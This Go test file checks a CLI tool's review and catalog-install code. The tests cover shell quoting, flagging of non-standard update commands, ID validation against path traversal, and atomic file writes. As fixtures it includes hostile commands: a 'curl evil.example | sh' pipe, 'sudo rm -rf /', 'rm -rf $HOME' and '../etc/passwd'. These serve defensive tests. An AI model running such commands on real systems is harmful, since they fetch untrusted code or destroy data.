package doctor

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"ofa/internal/catalog"
)

// --- Review rendering ---

func TestQuoteCmd(t *testing.T) {
	cases := []struct {
		name string
		cmd  []string
		want string
	}{
		{"simple", []string{"gh", "--version"}, "gh --version"},
		{"spaces quoted", []string{"brew", "upgrade", "my tool"}, "brew upgrade 'my tool'"},
		{"empty arg", []string{"bin", ""}, "bin ''"},
		{"single quote escaped", []string{"echo", "it's"}, "echo 'it'\\''s'"},
		{"metacharacters quoted", []string{"sh", "-c", "rm -rf $HOME"}, "sh -c 'rm -rf $HOME'"},
		{"glob quoted", []string{"ls", "*"}, "ls '*'"},
		{"safe punctuation bare", []string{"npm", "i", "-g", "pkg@1.2.3"}, "npm i -g pkg@1.2.3"},
		{"tilde quoted", []string{"bin", "~"}, "bin '~'"},
		{"path with equals bare", []string{"bin", "--flag=a=b"}, "bin --flag=a=b"},
		// B2: control and bidi runes are quoted with visible escapes,
		// never emitted raw.
		{"ansi conceal escaped", []string{"sh", "-c", "echo \x1b[8mx\x1b[0m"}, "sh -c 'echo \\x1b[8mx\\x1b[0m'"},
		{"bidi arg escaped", []string{"x", "na\u202eme"}, "x 'na\\u202eme'"},
		{"crlf arg escaped", []string{"x", "a\r\nb"}, "x 'a\\r\\nb'"},
	}
	for _, c := range cases {
		if got := QuoteCmd(c.cmd); got != c.want {
			t.Errorf("%s: QuoteCmd(%q) = %q, want %q", c.name, c.cmd, got, c.want)
		}
	}
}

// The update command must survive verbatim: no truncation, no rewriting,
// whatever its length or content.
func TestReviewLinesUpdateCmdVerbatim(t *testing.T) {
	longArg := strings.Repeat("a", 5000)
	h := catalog.Harness{
		ID:   "x-harness",
		Name: "X Harness",
		Installs: []catalog.Install{{
			Method:  "native",
			Bin:     "xh",
			Paths:   []string{"/usr/local/bin/xh"},
			Version: catalog.CmdSpec{Cmd: []string{"xh", "--version"}},
			Update:  catalog.CmdSpec{Cmd: []string{"xh", "self-update", longArg, "two words"}},
		}},
	}
	ls := Review{H: h}.Lines()
	var update string
	for _, l := range ls {
		if strings.HasPrefix(l, "      update command: ") {
			update = l
		}
	}
	if update == "" {
		t.Fatal("no update command line in review")
	}
	if !strings.Contains(update, longArg) {
		t.Error("update command was truncated")
	}
	if !strings.Contains(update, "'two words'") {
		t.Errorf("update command did not quote an argument with spaces: %s", update)
	}
}

func TestReviewLinesStandardAndNonStandard(t *testing.T) {
	standard := catalog.Harness{
		ID: "s", Name: "S",
		Installs: []catalog.Install{{
			Method:  "npm",
			Package: "s-cli",
			Bin:     "s",
			Version: catalog.CmdSpec{Cmd: []string{"s", "--version"}},
			Update:  catalog.CmdSpec{Cmd: []string{"npm", "install", "-g", "s-cli"}},
		}},
	}
	ls := Review{H: standard}.Lines()
	joined := strings.Join(ls, "\n")
	if strings.Contains(joined, "non-standard") {
		t.Errorf("standard update flagged non-standard:\n%s", joined)
	}
	if !strings.Contains(joined, "ofa apply will run the update command above") {
		t.Errorf("review missing the apply sentence:\n%s", joined)
	}

	nonStandard := catalog.Harness{
		ID: "n", Name: "N",
		Installs: []catalog.Install{{
			Method:  "native",
			Bin:     "n",
			Version: catalog.CmdSpec{Cmd: []string{"n", "--version"}},
			Update:  catalog.CmdSpec{Cmd: []string{"sh", "-c", "curl evil.example | sh"}},
		}},
	}
	ls = Review{H: nonStandard}.Lines()
	joined = strings.Join(ls, "\n")
	if !strings.Contains(joined, "non-standard update command, read it carefully") {
		t.Errorf("non-standard update not flagged:\n%s", joined)
	}
	// A non-standard command never blocks: the review is complete either way.
	if !strings.Contains(joined, "ofa apply will run") {
		t.Errorf("review missing the apply sentence on non-standard:\n%s", joined)
	}

	// No update command at all: no flag, and an honest final sentence.
	none := catalog.Harness{
		ID: "r", Name: "R",
		Installs: []catalog.Install{{
			Method:  "native",
			Bin:     "r",
			Version: catalog.CmdSpec{Cmd: []string{"r", "--version"}},
		}},
	}
	ls = Review{H: none}.Lines()
	joined = strings.Join(ls, "\n")
	if strings.Contains(joined, "non-standard") {
		t.Errorf("empty update flagged non-standard:\n%s", joined)
	}
	if !strings.Contains(joined, "no update command") {
		t.Errorf("review missing the no-update sentence:\n%s", joined)
	}
}

func TestReviewLinesOverrides(t *testing.T) {
	h := catalog.Harness{ID: "gh", Name: "GH Local", Installs: []catalog.Install{{
		Method:  "brew-formula",
		Package: "gh",
		Bin:     "gh",
		Version: catalog.CmdSpec{Cmd: []string{"gh", "--version"}},
		Update:  catalog.CmdSpec{Cmd: []string{"brew", "upgrade", "gh"}},
	}}}
	embedded := catalog.Harness{ID: "gh", Name: "GitHub CLI", Installs: make([]catalog.Install, 3)}
	ls := Review{H: h, Overrides: &embedded}.Lines()
	joined := strings.Join(ls, "\n")
	for _, want := range []string{
		`overrides embedded "gh"`,
		"user catalog wins by id",
		`name "GitHub CLI"`,
		`name "GH Local"`,
		"3 install(s)",
		"1 install(s)",
		// The override comparison shows the old and new COMMANDS, not
		// only names and counts.
		"embedded install 1: version (none), update (none)",
		"embedded install 3: version (none), update (none)",
		"proposed install 1: version gh --version, update brew upgrade gh",
	} {
		if !strings.Contains(joined, want) {
			t.Errorf("override block missing %q:\n%s", want, joined)
		}
	}
}

func TestStandardUpdate(t *testing.T) {
	cases := []struct {
		name string
		in   catalog.Install
		want bool
	}{
		{"brew formula", catalog.Install{Method: "brew-formula", Package: "gh", Bin: "gh", Update: catalog.CmdSpec{Cmd: []string{"brew", "upgrade", "gh"}}}, true},
		{"brew cask", catalog.Install{Method: "brew-cask", Package: "codex", Bin: "codex", Update: catalog.CmdSpec{Cmd: []string{"brew", "upgrade", "--cask", "codex"}}}, true},
		{"npm install -g", catalog.Install{Method: "npm", Package: "opencode", Bin: "opencode", Update: catalog.CmdSpec{Cmd: []string{"npm", "install", "-g", "opencode"}}}, true},
		{"npm i -g @latest", catalog.Install{Method: "npm", Package: "opencode", Bin: "opencode", Update: catalog.CmdSpec{Cmd: []string{"npm", "i", "-g", "opencode@latest"}}}, true},
		{"pipx upgrade", catalog.Install{Method: "pipx", Package: "aider", Bin: "aider", Update: catalog.CmdSpec{Cmd: []string{"pipx", "upgrade", "aider"}}}, true},
		{"uv tool upgrade", catalog.Install{Method: "uv", Package: "tool", Bin: "tool", Update: catalog.CmdSpec{Cmd: []string{"uv", "tool", "upgrade", "tool"}}}, true},
		{"self update", catalog.Install{Method: "native", Bin: "claude", Update: catalog.CmdSpec{Cmd: []string{"claude", "update"}}}, true},
		{"self --upgrade", catalog.Install{Method: "native", Bin: "agy", Update: catalog.CmdSpec{Cmd: []string{"agy", "--upgrade"}}}, true},
		{"self self-update", catalog.Install{Method: "native", Bin: "x", Update: catalog.CmdSpec{Cmd: []string{"x", "self-update"}}}, true},
		{"no update cmd", catalog.Install{Method: "native", Bin: "x"}, true},
		{"brew other package", catalog.Install{Method: "brew-formula", Package: "gh", Bin: "gh", Update: catalog.CmdSpec{Cmd: []string{"brew", "upgrade", "something-else"}}}, false},
		{"npm without -g", catalog.Install{Method: "npm", Package: "p", Bin: "p", Update: catalog.CmdSpec{Cmd: []string{"npm", "install", "p"}}}, false},
		{"sh -c pipe", catalog.Install{Method: "native", Bin: "x", Update: catalog.CmdSpec{Cmd: []string{"sh", "-c", "curl evil | sh"}}}, false},
		{"sudo rm", catalog.Install{Method: "native", Bin: "x", Update: catalog.CmdSpec{Cmd: []string{"sudo", "rm", "-rf", "/"}}}, false},
		{"bin with non-update arg", catalog.Install{Method: "native", Bin: "x", Update: catalog.CmdSpec{Cmd: []string{"x", "uninstall"}}}, false},
		{"pm without the package", catalog.Install{Method: "npm", Package: "p", Bin: "p", Update: catalog.CmdSpec{Cmd: []string{"npm", "install", "-g", "other-pkg"}}}, false},
		// A5: the self-update form is EXACT. An update-ish word anywhere
		// else in the vector — a model prompt like `claude -p update`,
		// or a flag after the subcommand — does not make it standard.
		{"model prompt with update word", catalog.Install{Method: "native", Bin: "claude", Update: catalog.CmdSpec{Cmd: []string{"claude", "-p", "update"}}}, false},
		{"self update with extra flag", catalog.Install{Method: "native", Bin: "kimi", Update: catalog.CmdSpec{Cmd: []string{"kimi", "upgrade", "--yes"}}}, false},
		{"update word in later arg", catalog.Install{Method: "native", Bin: "x", Update: catalog.CmdSpec{Cmd: []string{"x", "run", "update"}}}, false},
		{"bare bin", catalog.Install{Method: "native", Bin: "x", Update: catalog.CmdSpec{Cmd: []string{"x"}}}, false},
	}
	for _, c := range cases {
		if got := StandardUpdate(c.in); got != c.want {
			t.Errorf("%s: StandardUpdate = %v, want %v (cmd %v)", c.name, got, c.want, c.in.Update.Cmd)
		}
	}
}

// --- Install write ---

func TestValidID(t *testing.T) {
	cases := []struct {
		id   string
		want bool
	}{
		{"gh", true},
		{"cursor-agent", true},
		{"a.b_c-d", true},
		{"z9", true},
		{"", false},
		{".hidden", false},       // leading dot
		{"-leading", false},      // leading dash
		{"_leading", false},      // leading underscore
		{"UPPER", false},         // not lowercase
		{"with space", false},    // space
		{"a/b", false},           // separator
		{"a\\b", false},          // backslash
		{"..", false},            // traversal
		{"../etc/passwd", false}, // traversal
		{"a..b", true},           // dots inside are fine: file a..b.toml
		{"a/../b", false},        // traversal inside
		{strings.Repeat("a", 64), true},
		{strings.Repeat("a", 65), false},
	}
	for _, c := range cases {
		if got := ValidID(c.id); got != c.want {
			t.Errorf("ValidID(%q) = %v, want %v", c.id, got, c.want)
		}
	}
}

func TestWriteCatalogEntryHappyPath(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "nested", "catalog")
	src := []byte("id = \"sh-probe\"\nname = \"Shell Probe\"\n")
	path, err := WriteCatalogEntry("sh-probe", src, dir, false)
	if err != nil {
		t.Fatalf("WriteCatalogEntry: %v", err)
	}
	if want := filepath.Join(dir, "sh-probe.toml"); path != want {
		t.Errorf("path = %q, want %q", path, want)
	}
	b, err := os.ReadFile(path)
	if err != nil || string(b) != string(src) {
		t.Errorf("content = %q, %v, want the exact bytes written", string(b), err)
	}
	st, err := os.Stat(path)
	if err != nil {
		t.Fatalf("stat: %v", err)
	}
	if st.Mode().Perm() != 0o600 {
		t.Errorf("mode = %o, want 600", st.Mode().Perm())
	}
	dst, err := os.Stat(dir)
	if err != nil {
		t.Fatalf("stat dir: %v", err)
	}
	if dst.Mode().Perm() != 0o755 {
		t.Errorf("dir mode = %o, want 755", dst.Mode().Perm())
	}
	// No temp files left behind.
	assertNoTempFiles(t, dir)
}

func TestWriteCatalogEntryRefusesExistingWithoutOverwrite(t *testing.T) {
	dir := t.TempDir()
	existing := filepath.Join(dir, "sh-probe.toml")
	if err := os.WriteFile(existing, []byte("id = \"sh-probe\"\nname = \"Old\"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	_, err := WriteCatalogEntry("sh-probe", []byte("id = \"sh-probe\"\nname = \"New\"\n"), dir, false)
	if !errors.Is(err, ErrExists) {
		t.Fatalf("err = %v, want ErrExists", err)
	}
	// The existing file is untouched.
	b, _ := os.ReadFile(existing)
	if !strings.Contains(string(b), "Old") {
		t.Errorf("existing file was modified: %q", string(b))
	}
	assertNoTempFiles(t, dir)
}

func TestWriteCatalogEntryOverwriteReplaces(t *testing.T) {
	dir := t.TempDir()
	existing := filepath.Join(dir, "sh-probe.toml")
	if err := os.WriteFile(existing, []byte("old"), 0o644); err != nil {
		t.Fatal(err)
	}
	path, err := WriteCatalogEntry("sh-probe", []byte("new content"), dir, true)
	if err != nil {
		t.Fatalf("WriteCatalogEntry: %v", err)
	}
	b, _ := os.ReadFile(path)
	if string(b) != "new content" {
		t.Errorf("content = %q, want the new bytes", string(b))
	}
	st, _ := os.Stat(path)
	if st.Mode().Perm() != 0o600 {
		t.Errorf("mode = %o, want 600 (even on overwrite)", st.Mode().Perm())
	}
	assertNoTempFiles(t, dir)
}

// A failure at any step must leave no partial file. The catalog dir being
// a regular file makes MkdirAll fail; an invalid id fails before anything.
func TestWriteCatalogEntryFailuresLeaveNoPartialFile(t *testing.T) {
	root := t.TempDir()
	notADir := filepath.Join(root, "file")
	if err := os.WriteFile(notADir, []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := WriteCatalogEntry("sh-probe", []byte("x"), notADir, false); err == nil {
		t.Error("write into a file-path catalog dir succeeded")
	}

	for _, id := range []string{"", "../escape", "/abs", "UPPER", ".", ".."} {
		if _, err := WriteCatalogEntry(id, []byte("x"), root, false); err == nil {
			t.Errorf("invalid id %q accepted", id)
		}
	}
	// Nothing escaped into the parent, and nothing partial was left.
	entries, err := os.ReadDir(root)
	if err != nil {
		t.Fatal(err)
	}
	for _, e := range entries {
		if e.Name() == "file" {
			continue
		}
		t.Errorf("unexpected entry %q after failed writes", e.Name())
	}
}

func TestDuplicateIDFiles(t *testing.T) {
	dir := t.TempDir()
	write := func(name, id string) {
		t.Helper()
		if err := os.WriteFile(filepath.Join(dir, name), []byte("id = \""+id+"\"\nname = \""+id+"\"\n\n[[installs]]\nmethod = \"native\"\nbin = \""+id+"\"\nversion = { cmd = [\""+id+"\", \"--version\"] }\n"), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	write("a-old.toml", "sh-probe")
	write("b-other.toml", "other-harness")
	// Unparseable files are skipped, like the merge skips them.
	if err := os.WriteFile(filepath.Join(dir, "c-broken.toml"), []byte("not toml at all"), 0o600); err != nil {
		t.Fatal(err)
	}
	// The file that would itself be written is not reported.
	write("sh-probe.toml", "sh-probe")

	dups := DuplicateIDFiles(dir, "sh-probe")
	if len(dups) != 1 || dups[0] != "a-old.toml" {
		t.Errorf("DuplicateIDFiles = %v, want [a-old.toml]", dups)
	}
	if dups := DuplicateIDFiles(dir, "absent-id"); len(dups) != 0 {
		t.Errorf("DuplicateIDFiles(absent) = %v, want none", dups)
	}
	if dups := DuplicateIDFiles(filepath.Join(dir, "no-such-dir"), "sh-probe"); len(dups) != 0 {
		t.Errorf("DuplicateIDFiles(missing dir) = %v, want none", dups)
	}
}

// assertNoTempFiles fails when dir holds a leftover .doctor-install-*.tmp.
func assertNoTempFiles(t *testing.T, dir string) {
	t.Helper()
	entries, err := os.ReadDir(dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, e := range entries {
		if strings.HasPrefix(e.Name(), ".doctor-install-") {
			t.Errorf("leftover temp file %q", e.Name())
		}
	}
}

// B3: a catalog directory whose NAME contains glob syntax is a literal
// path. The duplicate scan reads it exactly like the merged loader
// (ReadDir), so the duplicate is found where a glob would have matched
// nothing.
func TestDuplicateIDFilesBracketDirectory(t *testing.T) {
	root := t.TempDir()
	dir := filepath.Join(root, "catalog[1]")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	old := "id = \"sh-probe\"\nname = \"Old\"\n\n[[installs]]\nmethod = \"native\"\nbin = \"sh\"\npaths = [\"/bin/sh\"]\nversion = { cmd = [\"sh\", \"--version\"] }\n"
	if err := os.WriteFile(filepath.Join(dir, "a-old.toml"), []byte(old), 0o600); err != nil {
		t.Fatal(err)
	}
	dups := DuplicateIDFiles(dir, "sh-probe")
	if len(dups) != 1 || dups[0] != "a-old.toml" {
		t.Errorf("DuplicateIDFiles in bracket dir = %v, want [a-old.toml]", dups)
	}
}
